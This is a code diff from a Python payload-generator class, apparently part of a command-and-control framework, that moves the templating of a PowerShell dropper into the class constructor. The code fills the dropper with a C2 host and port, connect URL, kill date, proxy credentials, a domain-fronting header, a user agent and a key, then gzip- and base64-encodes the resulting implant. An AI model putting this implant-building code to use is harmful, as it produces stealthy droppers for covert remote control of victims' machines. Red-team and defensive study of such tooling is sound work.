@@ -57,6 +57,23 @@ class Payloads(object):
     cs6 = cs5.replace("#REPLACECONNECTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
     cs7 = cs6.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
     cs8 = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)
+
+    with open("%sdropper.ps1" % FilesDirectory, 'rb') as f:
+     content = f.read()
+
+    cs = content.replace("#REPLACEINSECURE#",self.Insecure)
+    cs1 = cs.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
+    cs2 = cs1.replace("#REPLACEIMPTYPE#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+self.ImplantType))
+    cs3 = cs2.replace("#REPLACEKILLDATE#",self.KillDate)
+    cs4 = cs3.replace("#REPLACEPROXYUSER#",self.Proxyuser)
+    cs5 = cs4.replace("#REPLACEPROXYPASS#",self.Proxypass)
+    cs6 = cs5.replace("#REPLACEPROXYURL#",self.Proxyurl)
+    cs7 = cs6.replace("#REPLACEPROXY#",self.Proxy)
+    cs8 = cs7.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
+    cs9 = cs8.replace("#REPLACECONNECT#",self.ConnectURL)
+    cs10 = cs9.replace("#REPLACEUSERAGENT#",self.UserAgent)
+    cs11 = cs10.replace("#REPLACEREFERER#",self.Referer)
+    self.C2Core = cs11.replace("#REPLACEKEY#",self.Key)
      
   def QuickstartLog( self, txt ):
     if not self.quickstart: self.quickstart = ''
@@ -82,23 +99,6 @@ class Payloads(object):
       return base64.b64encode(b64gzip.encode('UTF-16LE'))
 
   def CreateRaw(self, name=""):
-    with open("%sdropper.ps1" % FilesDirectory, 'rb') as f:
-     content = f.read()
-
-    cs = content.replace("#REPLACEINSECURE#",self.Insecure)
-    cs1 = cs.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
-    cs2 = cs1.replace("#REPLACEIMPTYPE#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+self.ImplantType))
-    cs3 = cs2.replace("#REPLACEKILLDATE#",self.KillDate)
-    cs4 = cs3.replace("#REPLACEPROXYUSER#",self.Proxyuser)
-    cs5 = cs4.replace("#REPLACEPROXYPASS#",self.Proxypass)
-    cs6 = cs5.replace("#REPLACEPROXYURL#",self.Proxyurl)
-    cs7 = cs6.replace("#REPLACEPROXY#",self.Proxy)
-    cs8 = cs7.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
-    cs9 = cs8.replace("#REPLACECONNECT#",self.ConnectURL)
-    cs10 = cs9.replace("#REPLACEUSERAGENT#",self.UserAgent)
-    cs11 = cs10.replace("#REPLACEREFERER#",self.Referer)
-    self.C2Core = cs11.replace("#REPLACEKEY#",self.Key)
-    
     out = StringIO.StringIO()
     with gzip.GzipFile(fileobj=out, mode="w") as f:
       f.write((self.C2Core))
